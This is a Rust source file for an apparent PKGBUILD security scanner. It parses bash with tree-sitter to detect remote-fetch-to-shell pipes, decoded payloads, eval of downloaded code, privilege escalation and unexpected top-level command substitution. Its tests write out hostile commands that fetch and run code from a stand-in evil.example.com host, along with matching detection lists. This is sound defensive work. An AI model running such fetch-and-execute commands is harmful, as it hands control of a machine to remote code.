//! AST-based structural checks for the PKGBUILD scanner, on top of
//! tree-sitter-bash.
//!
//! The line-based heuristics in `security.rs` are cheap but pure text
//! matching, so they miss anything that doesn't literally contain the
//! grepped substring: `curl ... | s""h` (concatenation evaluates to
//! `sh` at runtime, no literal "sh" on the line), `# sudo ./validator`
//! or `makedepends=('sudo')` (structurally not a `command` node, so no
//! comment/array-literal carve-out needed here).
//!
//! Each function parses with tree-sitter-bash and walks the real tree.
//! `None` covers both "not found" and "couldn't parse" -- callers in
//! `security.rs` fall back to the line-based heuristic either way
//! (`.or_else(...)`), so a parse failure only loses extra precision,
//! never drops the check.
//!
//! Command names are only matched when statically known (`resolve_word`
//! bails on any unresolved `$expansion`/`$(...)`) -- a command invoked
//! through a variable (`$RUNNER ./validator`) is a real blind spot here,
//! as with any static analysis.

use tree_sitter::Node;

fn parse(source: &str) -> Option<tree_sitter::Tree> {
    let mut parser = tree_sitter::Parser::new();
    // tree-sitter 0.22+ moved grammar crates off a raw `extern "C"`
    // language-getter function and onto a `LanguageFn` static (the
    // `tree-sitter-language` crate's abstraction, meant to decouple a
    // grammar's own release cadence from the core `tree-sitter` crate's
    // ABI) -- `LANGUAGE.into()` converts that into the `Language` value
    // `set_language` wants, which itself now takes it by reference.
    let language: tree_sitter::Language = tree_sitter_bash::LANGUAGE.into();
    parser.set_language(&language).ok()?;
    parser.parse(source, None)
}

fn find_descendants<'a>(node: Node<'a>, kind: &str, out: &mut Vec<Node<'a>>) {
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        if child.kind() == kind {
            out.push(child);
        }
        find_descendants(child, kind, out);
    }
}

/// Resolves a `word` / `raw_string` ('...') / `string` ("...") /
/// `concatenation` node to a literal string. Returns `None` if the value
/// depends on anything dynamic (an `expansion` or `command_substitution`
/// inside a double-quoted string) - we never guess at a value we can't
/// actually determine statically.
fn resolve_word(node: Node, src: &[u8]) -> Option<String> {
    match node.kind() {
        "word" => Some(node.utf8_text(src).ok()?.to_string()),
        "raw_string" => Some(node.utf8_text(src).ok()?.trim_matches('\'').to_string()),
        "string" => {
            let mut out = String::new();
            let mut cursor = node.walk();
            for child in node.children(&mut cursor) {
                match child.kind() {
                    "\"" => {}
                    "string_content" => out.push_str(child.utf8_text(src).ok()?),
                    _ => return None, // expansion/command_substitution inside
                }
            }
            Some(out)
        }
        "concatenation" => {
            let mut out = String::new();
            let mut cursor = node.walk();
            for child in node.children(&mut cursor) {
                out.push_str(&resolve_word(child, src)?);
            }
            Some(out)
        }
        _ => None,
    }
}

/// Statically-known command name of a `command` node (lowercased), or
/// `None` if it's built from an unresolved expansion.
fn command_name_of(command_node: Node, src: &[u8]) -> Option<String> {
    let mut cursor = command_node.walk();
    let name_node = command_node.children(&mut cursor).find(|c| c.kind() == "command_name")?;
    let mut c2 = name_node.walk();
    let first_child = name_node.children(&mut c2).next()?;
    resolve_word(first_child, src).map(|s| s.to_lowercase())
}

fn basename(s: &str) -> &str {
    s.rsplit('/').next().unwrap_or(s)
}

fn line_of(node: Node) -> usize {
    node.start_position().row + 1
}

const SHELL_NAMES: &[&str] = &["sh", "bash", "zsh", "dash", "ash"];
const FETCHERS: &[&str] = &["curl", "wget"];
const ESCALATORS: &[&str] = &["sudo", "pkexec", "doas"];

/// Structural equivalent of `curl_pipe_shell_line`: a `pipeline` node
/// where some earlier command resolves to curl/wget and the last command
/// resolves to a shell - survives quoting (`| "sh"`, `| 'sh'`),
/// concatenation (`| s""h`), absolute paths (`| /bin/sh`), and `env`
/// wrappers (`| env bash`, `| env -S sh`) uniformly, instead of needing a
/// separate carve-out for each.
pub(crate) fn curl_pipe_shell(source: &str) -> Option<usize> {
    let tree = parse(source)?;
    let src = source.as_bytes();
    let mut pipelines = Vec::new();
    find_descendants(tree.root_node(), "pipeline", &mut pipelines);
    for pipeline in pipelines {
        let mut cursor = pipeline.walk();
        let commands: Vec<Node> = pipeline.children(&mut cursor).filter(|c| c.kind() == "command").collect();
        if commands.len() < 2 {
            continue;
        }
        let has_fetcher = commands[..commands.len() - 1]
            .iter()
            .any(|c| command_name_of(*c, src).is_some_and(|n| FETCHERS.contains(&n.as_str())));
        if !has_fetcher {
            continue;
        }
        let last = commands[commands.len() - 1];
        if let Some(name) = command_name_of(last, src) {
            // `env sh` / `env -S bash`: the real interpreter is the first
            // non-flag argument to env, not "env" itself.
            let effective = if name == "env" {
                let mut c3 = last.walk();
                let arg_words: Vec<Node> = last.children(&mut c3).filter(|c| c.kind() == "word").collect();
                arg_words.into_iter().filter_map(|w| resolve_word(w, src)).find(|w| !w.starts_with('-'))
            } else {
                Some(name)
            };
            if let Some(eff) = effective {
                if SHELL_NAMES.contains(&basename(&eff)) {
                    return Some(line_of(pipeline));
                }
            }
        }
    }
    None
}

/// Does `cmd` resolve, possibly through an `env`/`env -S` wrapper, to one
/// of `SHELL_NAMES`? The "is the last stage of this pipeline a shell"
/// half of `curl_pipe_shell`, factored out so `decode_pipe_shell` below
/// can reuse it instead of duplicating the env-unwrap/quoting/
/// concatenation handling.
fn command_is_shell(cmd: Node, src: &[u8]) -> bool {
    let Some(name) = command_name_of(cmd, src) else { return false };
    let effective = if name == "env" {
        let mut c3 = cmd.walk();
        let arg_words: Vec<Node> = cmd.children(&mut c3).filter(|c| c.kind() == "word").collect();
        arg_words.into_iter().filter_map(|w| resolve_word(w, src)).find(|w| !w.starts_with('-'))
    } else {
        Some(name)
    };
    effective.is_some_and(|eff| SHELL_NAMES.contains(&basename(&eff)))
}

/// Command names that decode/obfuscate an inline payload rather than fetch
/// one over the network -- the base64/hex analog of `FETCHERS`, checked by
/// `decode_pipe_shell`.
const DECODERS: &[&str] = &["base64", "xxd"];

/// All of `cmd`'s arguments (everything but the command name itself),
/// statically resolved to strings -- an argument built from something
/// dynamic is just dropped rather than bailing the whole command, since a
/// flag check only needs to see the *literal* flags to reach a confident
/// "yes" and dropping one unresolved argument can't turn a real "yes" into
/// a false "no".
fn command_arg_words(cmd: Node, src: &[u8]) -> Vec<String> {
    let mut cursor = cmd.walk();
    cmd.children(&mut cursor)
        .filter(|c| c.kind() != "command_name")
        .filter_map(|c| resolve_word(c, src))
        .collect()
}

/// Structural equivalent of `base64_pipe_shell_line`/`xxd_pipe_shell_line`:
/// a `pipeline` node where an earlier command is `base64` with a
/// `-d`/`--decode` flag, or `xxd` with both a `-r` and a `-p` flag
/// (combined or separate, either order), and the last command resolves to
/// a shell -- same env-wrapper/quoting/concatenation handling as
/// `curl_pipe_shell`, via `command_is_shell`. Same obfuscation role as
/// curl|sh, just decoding an inline-stashed blob instead of fetching one.
pub(crate) fn decode_pipe_shell(source: &str) -> Option<usize> {
    let tree = parse(source)?;
    let src = source.as_bytes();
    let mut pipelines = Vec::new();
    find_descendants(tree.root_node(), "pipeline", &mut pipelines);
    for pipeline in pipelines {
        let mut cursor = pipeline.walk();
        let commands: Vec<Node> = pipeline.children(&mut cursor).filter(|c| c.kind() == "command").collect();
        if commands.len() < 2 {
            continue;
        }
        let has_decoder = commands[..commands.len() - 1].iter().any(|c| {
            let Some(name) = command_name_of(*c, src) else { return false };
            if !DECODERS.contains(&name.as_str()) {
                return false;
            }
            let flags: Vec<String> = command_arg_words(*c, src).iter().map(|a| a.to_lowercase()).collect();
            let is_short_flag_containing = |f: &str, ch: char| {
                f.starts_with('-') && !f.starts_with("--") && f.contains(ch)
            };
            match name.as_str() {
                "base64" => flags.iter().any(|f| f == "-d" || f == "--decode" || is_short_flag_containing(f, 'd')),
                "xxd" => {
                    let has_r = flags.iter().any(|f| is_short_flag_containing(f, 'r'));
                    let has_p = flags.iter().any(|f| is_short_flag_containing(f, 'p'));
                    has_r && has_p
                }
                _ => false,
            }
        });
        if !has_decoder {
            continue;
        }
        let last = commands[commands.len() - 1];
        if command_is_shell(last, src) {
            return Some(line_of(pipeline));
        }
    }
    None
}

/// Structural equivalent of `source_process_subst_line`: a `source` (or
/// `.`) command whose argument is a `process_substitution` (`<(...)`)
/// containing a curl/wget command anywhere inside it -- the process-
/// substitution cousin of `eval_remote_exec` (command substitution,
/// `$(...)`) and `curl_pipe_shell` (a literal pipe): the fetched script is
/// read straight out of the substitution by `source`/`.`, with neither a
/// pipe nor a `$(...)` for those other two checks to key on.
pub(crate) fn source_process_subst_remote(source: &str) -> Option<usize> {
    let tree = parse(source)?;
    let src = source.as_bytes();
    let mut commands = Vec::new();
    find_descendants(tree.root_node(), "command", &mut commands);
    for cmd in &commands {
        let Some(name) = command_name_of(*cmd, src) else { continue };
        if name != "source" && name != "." {
            continue;
        }
        let mut substs = Vec::new();
        find_descendants(*cmd, "process_substitution", &mut substs);
        for subst in substs {
            let mut inner = Vec::new();
            find_descendants(subst, "command", &mut inner);
            if inner.iter().any(|c| command_name_of(*c, src).is_some_and(|n| FETCHERS.contains(&n.as_str()))) {
                return Some(line_of(*cmd));
            }
        }
    }
    None
}

/// Structural equivalent of `eval_remote_exec_line`: an `eval` command
/// whose arguments contain a `command_substitution` that itself contains
/// a curl/wget command anywhere inside it, however it's nested (piped,
/// wrapped, etc.) - not just "the line contains `$(` and `curl`".
pub(crate) fn eval_remote_exec(source: &str) -> Option<usize> {
    let tree = parse(source)?;
    let src = source.as_bytes();
    let mut commands = Vec::new();
    find_descendants(tree.root_node(), "command", &mut commands);
    for cmd in &commands {
        let Some(name) = command_name_of(*cmd, src) else { continue };
        if name != "eval" {
            continue;
        }
        let mut substs = Vec::new();
        find_descendants(*cmd, "command_substitution", &mut substs);
        for subst in substs {
            let mut inner = Vec::new();
            find_descendants(subst, "command", &mut inner);
            if inner.iter().any(|c| command_name_of(*c, src).is_some_and(|n| FETCHERS.contains(&n.as_str()))) {
                return Some(line_of(*cmd));
            }
        }
    }
    None
}

/// Structural equivalent of `sudo_escalation_line`: an actual `command`
/// node whose name is sudo/pkexec/doas. Comments and array literals
/// (`makedepends=('sudo')`) are structurally not `command` nodes at all,
/// so they're excluded for free instead of needing their own check.
pub(crate) fn sudo_escalation(source: &str) -> Option<usize> {
    let tree = parse(source)?;
    let src = source.as_bytes();
    let mut commands = Vec::new();
    find_descendants(tree.root_node(), "command", &mut commands);
    for cmd in commands {
        if let Some(name) = command_name_of(cmd, src) {
            if ESCALATORS.contains(&name.as_str()) {
                return Some(line_of(cmd));
            }
        }
    }
    None
}

/// Structural equivalent of `python_inline_exec_line`: a python/python3
/// command invoked with `-c` whose argument string statically resolves
/// and contains `exec(`/`eval(`/`os.system(`/`subprocess.`/`os.popen(`.
pub(crate) fn python_inline_exec(source: &str) -> Option<usize> {
    let tree = parse(source)?;
    let src = source.as_bytes();
    let mut commands = Vec::new();
    find_descendants(tree.root_node(), "command", &mut commands);
    for cmd in commands {
        let Some(name) = command_name_of(cmd, src) else { continue };
        if !["python", "python2", "python3"].contains(&name.as_str()) {
            continue;
        }
        let mut cursor = cmd.walk();
        let args: Vec<Node> = cmd.children(&mut cursor).collect();
        let has_dash_c = args.iter().any(|a| a.kind() == "word" && a.utf8_text(src) == Ok("-c"));
        if !has_dash_c {
            continue;
        }
        for a in &args {
            if matches!(a.kind(), "string" | "raw_string") {
                if let Some(text) = resolve_word(*a, src) {
                    let lower = text.to_lowercase();
                    if ["exec(", "eval(", "os.system(", "subprocess.", "os.popen("].iter().any(|p| lower.contains(p)) {
                        return Some(line_of(cmd));
                    }
                }
            }
        }
    }
    None
}

const DEP_ARRAY_NAMES: &[&str] = &["depends", "makedepends", "checkdepends"];

/// Statically resolves `depends=(...)`/`makedepends=(...)`/
/// `checkdepends=(...)` (bare + `_<current_arch>`-suffixed) to a flat,
/// deduped list of bare package names for `pacman -S`, used by
/// `packages::build_with_sandbox` to install deps before any
/// PKGBUILD-authored code runs -- outside the sandbox entirely, since
/// it's just pacman resolving names.
///
/// Version constraints (`foo>=1.2`) are trimmed to the bare name --
/// pacman does its own constraint checking.
///
/// Returns `None` (fall back to the unsandboxed path) if the file
/// doesn't parse, a dependency array isn't a plain array literal
/// (`depends=$deps`), or any element is dynamic (`$var`, `$(cmd)`). A
/// partially resolved list is worse than an honest "can't tell" -- a
/// silently-dropped dependency can fail confusingly well after the
/// sandboxed step already ran.
///
/// A different arch's suffixed array is simply skipped, not a bail.
pub(crate) fn pkgbuild_dependencies(source: &str, current_arch: &str) -> Option<Vec<String>> {
    let tree = parse(source)?;
    let src = source.as_bytes();
    let mut assignments = Vec::new();
    find_descendants(tree.root_node(), "variable_assignment", &mut assignments);

    let arch_suffixed: Vec<String> = DEP_ARRAY_NAMES.iter().map(|n| format!("{n}_{current_arch}")).collect();

    let mut found_any_array = false;
    let mut out = Vec::new();
    for assign in assignments {
        let mut cursor = assign.walk();
        let children: Vec<Node> = assign.children(&mut cursor).collect();
        let Some(name_node) = children.iter().find(|c| c.kind() == "variable_name") else { continue };
        let Ok(name) = name_node.utf8_text(src) else { continue };
        if !DEP_ARRAY_NAMES.contains(&name) && !arch_suffixed.iter().any(|a| a == name) {
            continue;
        }
        let Some(array_node) = children.iter().find(|c| c.kind() == "array") else {
            // e.g. depends=$foo / depends="$foo" -- not a literal array,
            // can't be trusted statically.
            return None;
        };
        found_any_array = true;
        let mut c2 = array_node.walk();
        for el in array_node.children(&mut c2) {
            if matches!(el.kind(), "(" | ")") {
                continue;
            }
            let raw = resolve_word(el, src)?; // bails to None on any dynamic element
            let bare = raw.split(['<', '>', '=']).next().unwrap_or(&raw);
            if !bare.is_empty() {
                out.push(bare.to_string());
            }
        }
    }

    if !found_any_array {
        // No depends/makedepends/checkdepends array present at all --
        // that's a legitimate "no declared dependencies", distinct from
        // "couldn't parse" (handled by the `parse(source)?` above).
        return Some(Vec::new());
    }
    out.sort();
    out.dedup();
    Some(out)
}

/// A `command_substitution` (`$(...)` or backtick) reachable from a
/// genuinely top-level PKGBUILD statement -- i.e. *not* inside any
/// `function_definition`'s body.
///
/// Different from every other check here: those look for a dangerous
/// *command*; this one cares *when* it runs. Top-level code executes
/// the instant the file is sourced -- by `makepkg --printsrcinfo`,
/// `updpkgsums`, any AUR helper's metadata read -- nowhere near the
/// bwrap sandbox that isolates `build()`/`prepare()`. A function body,
/// by contrast, only runs when makepkg explicitly calls it, so this
/// walks the tree skipping into `function_definition`s.
///
/// Caught for real: a `pkgdesc` copy-pasted from GitHub markdown kept
/// its code-span backticks (`` `bwrap` ``) -- inside a double-quoted
/// string that's still live command substitution, so `makepkg
/// --printsrcinfo` alone ran the literal `bwrap` command. Nothing else
/// in this file catches it -- not curl|sh, not eval, not sudo -- it's
/// *any* command substitution somewhere makepkg doesn't expect one.
pub(crate) fn top_level_command_substitution(source: &str) -> Option<usize> {
    let tree = parse(source)?;
    let root = tree.root_node();
    let mut cursor = root.walk();
    for stmt in root.children(&mut cursor) {
        if stmt.kind() == "function_definition" {
            continue;
        }
        let mut substs = Vec::new();
        find_descendants_skip_functions(stmt, "command_substitution", &mut substs);
        if let Some(first) = substs.first() {
            return Some(line_of(*first));
        }
    }
    None
}

/// Same walk as `find_descendants`, but never recurses into a
/// `function_definition`'s subtree - used by `top_level_command_substitution`
/// so a legitimate `pkgver() { git describe ...; }` (only ever executed
/// when makepkg explicitly calls `pkgver`, not on a bare `source`) is
/// never mistaken for top-level code.
fn find_descendants_skip_functions<'a>(node: Node<'a>, kind: &str, out: &mut Vec<Node<'a>>) {
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        if child.kind() == "function_definition" {
            continue;
        }
        if child.kind() == kind {
            out.push(child);
        }
        find_descendants_skip_functions(child, kind, out);
    }
}

#[cfg(test)]
mod ast_tests {
    use super::*;

    #[test]
    fn curl_pipe_shell_evasions_caught() {
        assert_eq!(curl_pipe_shell("curl -sSL https://x | sh"), Some(1));
        assert_eq!(curl_pipe_shell("wget -O- https://x | /bin/sh"), Some(1));
        assert_eq!(curl_pipe_shell("curl -sSL https://x | env bash"), Some(1));
        assert_eq!(curl_pipe_shell("curl -sSL https://x | \"sh\""), Some(1));
        assert_eq!(curl_pipe_shell("curl -sSL https://x | 'sh'"), Some(1));
        // bash string-concatenation evasion: literally "s" + "" + "h"
        assert_eq!(curl_pipe_shell("curl -sSL https://x | s\"\"h"), Some(1));
    }

    #[test]
    fn curl_pipe_shell_clean_cases_not_flagged() {
        assert_eq!(curl_pipe_shell("curl -sSL https://x -o file.tar.gz"), None);
        assert_eq!(curl_pipe_shell("curl -sSL https://x | tee log.txt"), None);
        assert_eq!(curl_pipe_shell("# curl -sSL https://x | sh"), None);
    }

    #[test]
    fn eval_remote_exec_caught_and_not_false_positive() {
        assert_eq!(eval_remote_exec("eval \"$(curl -sSL https://x)\""), Some(1));
        assert_eq!(eval_remote_exec("eval `wget -qO- https://x`"), Some(1));
        assert_eq!(eval_remote_exec("eval \"${some_array[@]}\""), None);
        assert_eq!(eval_remote_exec("# eval \"$(curl https://x)\""), None);
    }

    #[test]
    fn sudo_escalation_caught_and_not_false_positive() {
        assert_eq!(sudo_escalation("sudo ./validator --init"), Some(1));
        assert_eq!(sudo_escalation("pkexec /tmp/helper"), Some(1));
        assert_eq!(sudo_escalation("doas sh -c id"), Some(1));
        // must NOT flag: not a command, just an array element / comment
        assert_eq!(sudo_escalation("makedepends=('sudo')"), None);
        assert_eq!(sudo_escalation("depends=('sudo' 'other')"), None);
        assert_eq!(sudo_escalation("# sudo ./validator"), None);
    }

    #[test]
    fn decode_pipe_shell_base64_and_xxd_caught() {
        assert_eq!(decode_pipe_shell("base64 -d payload.b64 | sh"), Some(1));
        assert_eq!(decode_pipe_shell("base64 --decode payload.b64 | /bin/bash"), Some(1));
        assert_eq!(decode_pipe_shell("echo \"$blob\" | base64 -d | env bash"), Some(1));
        assert_eq!(decode_pipe_shell("xxd -r -p payload.hex | bash"), Some(1));
        assert_eq!(decode_pipe_shell("xxd -rp payload.hex | sh"), Some(1));
        // decoding but writing to a file, not a shell: must not flag
        assert_eq!(decode_pipe_shell("base64 -d payload.b64 -o payload.bin"), None);
        assert_eq!(decode_pipe_shell("base64 -d payload.b64 | tee out.bin"), None);
        // xxd without -p (default hex-dump-with-offsets format, not the
        // plain-hex encoding an attacker would actually stash a payload
        // in) shouldn't flag on -r alone
        assert_eq!(decode_pipe_shell("xxd -r dump.hex | sh"), None);
        assert_eq!(decode_pipe_shell("# base64 -d payload.b64 | sh"), None);
    }

    #[test]
    fn source_process_subst_remote_caught_and_not_false_positive() {
        assert_eq!(source_process_subst_remote("source <(curl -sSL https://x)"), Some(1));
        assert_eq!(source_process_subst_remote(". <(wget -qO- https://x)"), Some(1));
        // a process substitution not fed to source/. shouldn't flag
        assert_eq!(source_process_subst_remote("diff <(curl -sSL https://x) file.txt"), None);
        // source-ing a local file shouldn't flag
        assert_eq!(source_process_subst_remote("source ./helpers.sh"), None);
        assert_eq!(source_process_subst_remote("# source <(curl https://x)"), None);
    }

    #[test]
    fn python_inline_exec_caught_and_not_false_positive() {
        assert_eq!(
            python_inline_exec("python3 -c \"import base64,os; exec(base64.b64decode(os.environ['P']))\""),
            Some(1)
        );
        assert_eq!(python_inline_exec("python -c 'os.system(\"id\")'"), Some(1));
        assert_eq!(python_inline_exec("python3 -c 'print(1+1)'"), None);
        assert_eq!(python_inline_exec("python3 setup.py build"), None);
    }

    #[test]
    fn top_level_command_substitution_caught_and_not_false_positive() {
        // the real repro: backticks left over from a markdown code span,
        // pasted straight into pkgdesc.
        assert_eq!(
            top_level_command_substitution(
                "pkgdesc=\"runs untrusted build steps inside a `bwrap` sandbox.\"\npkgver=1.0.0"
            ),
            Some(1)
        );
        assert_eq!(
            top_level_command_substitution("url=\"$(curl -s https://evil.example.com/x)\""),
            Some(1)
        );
        // legitimate: command substitution *inside* a function body only
        // runs when makepkg calls that function, not on a bare source.
        assert_eq!(
            top_level_command_substitution("pkgver() {\n  cd \"$srcdir\"\n  git describe --long | sed 's/^v//'\n}\n"),
            None
        );
        assert_eq!(
            top_level_command_substitution("pkgver() {\n  echo \"$(git describe)\"\n}\n"),
            None
        );
        assert_eq!(top_level_command_substitution("pkgdesc=\"a perfectly normal package\""), None);
        assert_eq!(top_level_command_substitution("# pkgdesc=\"$(curl https://x)\""), None);
    }

    #[test]
    fn finds_findings_nested_inside_build_function() {
        let pkgbuild = r#"
pkgname=totally-legit-tool
pkgver=1.2.3
build() {
  cd "$srcdir"
  sudo ./validator --setup
  curl -sSL https://evil.example.com/x | /bin/sh
  eval "$(wget -qO- https://evil.example.com/y)"
}
"#;
        assert_eq!(sudo_escalation(pkgbuild), Some(6));
        assert_eq!(curl_pipe_shell(pkgbuild), Some(7));
        assert_eq!(eval_remote_exec(pkgbuild), Some(8));
    }

    #[test]
    fn clean_pkgbuild_hits_nothing() {
        let clean = r#"
pkgname=foo
pkgver=1.2.3
pkgrel=1
source=("https://github.com/foo/foo/archive/v$pkgver.tar.gz")
sha256sums=('abc123')
build() {
  cd "$pkgname-$pkgver"
  make
}
package() {
  cd "$pkgname-$pkgver"
  make DESTDIR="$pkgdir" install
}
"#;
        assert_eq!(sudo_escalation(clean), None);
        assert_eq!(curl_pipe_shell(clean), None);
        assert_eq!(eval_remote_exec(clean), None);
        assert_eq!(python_inline_exec(clean), None);
    }

    #[test]
    fn unparseable_input_falls_back_to_none_not_panic() {
        assert_eq!(curl_pipe_shell("{{{ not bash at all ]]]"), None);
    }

    #[test]
    fn pkgbuild_dependencies_resolves_versioned_and_quoted_entries() {
        let pkgbuild = r#"
pkgname=foo
depends=('glibc>=2.38' "openssl" 'zlib=1:1.3-1')
makedepends=(cmake ninja)
checkdepends=()
"#;
        let mut deps = pkgbuild_dependencies(pkgbuild, "x86_64").unwrap();
        deps.sort();
        assert_eq!(deps, vec!["cmake", "glibc", "ninja", "openssl", "zlib"]);
    }

    #[test]
    fn pkgbuild_dependencies_includes_current_arch_suffixed_array() {
        let pkgbuild = r#"
pkgname=foo
depends=('glibc')
depends_x86_64=('lib32-glibc')
depends_aarch64=('some-aarch64-only-lib')
"#;
        let mut deps = pkgbuild_dependencies(pkgbuild, "x86_64").unwrap();
        deps.sort();
        assert_eq!(deps, vec!["glibc", "lib32-glibc"]);
    }

    #[test]
    fn pkgbuild_dependencies_none_when_no_arrays_present_is_empty_not_none() {
        let pkgbuild = "pkgname=foo\npkgver=1.0\nbuild() { make }\n";
        assert_eq!(pkgbuild_dependencies(pkgbuild, "x86_64"), Some(Vec::new()));
    }

    #[test]
    fn pkgbuild_dependencies_bails_on_dynamic_element() {
        let pkgbuild = r#"
depends=('glibc' "$optional_dep")
"#;
        assert_eq!(pkgbuild_dependencies(pkgbuild, "x86_64"), None);
    }

    #[test]
    fn pkgbuild_dependencies_bails_on_non_array_assignment() {
        let pkgbuild = r#"
_deplist="glibc openssl"
depends=$_deplist
"#;
        assert_eq!(pkgbuild_dependencies(pkgbuild, "x86_64"), None);
    }
}